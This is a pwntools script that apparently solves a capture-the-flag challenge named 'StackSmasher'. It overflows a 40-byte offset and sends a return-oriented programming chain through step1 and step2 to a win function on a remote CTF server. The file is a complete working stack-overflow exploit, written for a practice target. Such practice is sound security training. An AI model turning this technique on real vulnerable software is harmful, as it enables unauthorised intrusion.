#!/usr/bin/env python3
from pwn import *

# Set the context for the binary
context.binary = elf = ELF('./StackSmasher')
context.arch = 'amd64'

# Establish the connection
p = remote('ctf.mf.grsu.by', 9078)
# To test locally: p = process()

# Get the addresses of our functions and the ret gadget
addr_step1 = elf.symbols['step1']
addr_step2 = elf.symbols['step2']
addr_win = elf.symbols['win']
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

log.info(f"Address of step1: {hex(addr_step1)}")
log.info(f"Address of step2: {hex(addr_step2)}")
log.info(f"Found 'ret' gadget: {hex(ret_gadget)}")
log.info(f"Address of win:   {hex(addr_win)}")

# The offset to the return address is 32 (buffer) + 8 (RBP) = 40
offset = 40
log.info(f"Using offset: {offset}")

# Build the ROP chain
# We add the 'ret' gadget before calling win to fix stack alignment
rop_chain = b""
rop_chain += p64(ret_gadget) # Alignment gadget
rop_chain += p64(addr_step1)
rop_chain += p64(addr_step2)
rop_chain += p64(addr_win)

# Build the final payload
# [ 'A' * 40 ] -> [ ret_gadget ] -> [ step1 ] -> [ step2 ] -> [ win ]
payload = b'A' * offset + rop_chain

# Wait for the prompt
p.recvuntil(b"Input username:")

# Send the payload
log.info("Sending final payload...")
p.sendline(payload)

# Get the flag!
p.interactive()

# If the above doesn't work, try this simpler chain (sometimes the extra ret isn't needed or misaligns it)
# rop_chain_simple = p64(addr_step1) + p64(addr_step2) + p64(addr_win)
# payload = b'A' * offset + rop_chain_simple